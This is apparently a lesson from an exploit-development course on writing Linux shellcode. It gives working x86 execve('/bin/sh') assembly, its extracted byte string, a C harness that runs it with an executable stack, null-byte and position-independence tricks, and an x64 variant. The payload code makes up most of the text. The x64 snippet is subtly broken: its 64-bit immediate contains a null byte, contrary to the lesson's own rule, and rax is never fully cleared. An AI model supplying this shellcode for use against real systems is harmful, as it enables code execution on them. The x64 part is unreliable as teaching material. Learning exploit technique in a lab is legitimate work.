# Day 3: Writing Shellcode in Assembly

## The Goal
Write raw machine code that spawns a shell when executed.
This is the payload that goes inside your exploit.

## Shellcode Constraints
1. **No null bytes** — C strings stop at \x00
2. **Position independent** — can't use absolute addresses (ASLR)
3. **Small** — must fit in the overflow buffer
4. **Self-contained** — no external libraries

## Linux x86 execve("/bin/sh") Shellcode
```nasm
; shellcode.asm — NASM syntax
; Assemble: nasm -f elf32 shellcode.asm -o shellcode.o
; Link:     ld -m elf_i386 shellcode.o -o shellcode

section .text
    global _start

_start:
    ; execve("/bin/sh", NULL, NULL)

    xor eax, eax        ; eax = 0 (avoids null bytes vs mov eax, 0)
    push eax             ; push null terminator for string
    push 0x68732f2f      ; push "//sh"
    push 0x6e69622f      ; push "/bin"
    mov ebx, esp         ; ebx = pointer to "/bin//sh\0"

    push eax             ; push NULL (argv[1])
    push ebx             ; push pointer to "/bin//sh"
    mov ecx, esp         ; ecx = argv array

    xor edx, edx         ; edx = NULL (envp)
    mov al, 11           ; syscall 11 = execve (use al to avoid nulls)
    int 0x80             ; trigger syscall
```

## Extracting Shellcode Bytes
```bash
# Compile
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 shellcode.o -o shellcode

# Extract raw bytes
objdump -d shellcode | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | tr -d '\n'

# Or use objcopy
objcopy -O binary shellcode shellcode.bin
xxd shellcode.bin
```

## Testing Shellcode in C
```c
// test_shellcode.c
// Compile: gcc -m32 -z execstack -o test test_shellcode.c

unsigned char shellcode[] =
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd"
    "\x80";

int main() {
    printf("Shellcode length: %zu\n", sizeof(shellcode) - 1);
    ((void(*)())shellcode)();  // cast to function pointer and call
    return 0;
}
```

## Common Shellcode Tricks
```nasm
; Avoid null bytes:
xor eax, eax         ; instead of: mov eax, 0
mov al, 11           ; instead of: mov eax, 11
push byte 0x0b       ; small immediate

; Get current address (position-independent):
call next
next:
pop esi              ; esi = address of "next" label
; Now you can reference data relative to esi

; JMP-CALL-POP trick:
jmp short call_me
shellcode_start:
    pop esi          ; esi = address of string
    ; ... use esi ...
call_me:
    call shellcode_start
    db "/bin/sh", 0  ; string stored after the call
```

## x64 Shellcode
```nasm
; 64-bit uses different syscall convention:
; syscall number in RAX
; args in RDI, RSI, RDX, R10, R8, R9
; trigger with: syscall (not int 0x80)

section .text
    global _start
_start:
    xor rsi, rsi         ; rsi = 0
    push rsi             ; null terminator
    mov rdi, 0x68732f6e69622f  ; "/bin/sh"
    push rdi
    mov rdi, rsp         ; rdi = pointer to "/bin/sh"
    xor rdx, rdx         ; rdx = NULL (envp)
    mov al, 59           ; syscall 59 = execve
    syscall
```
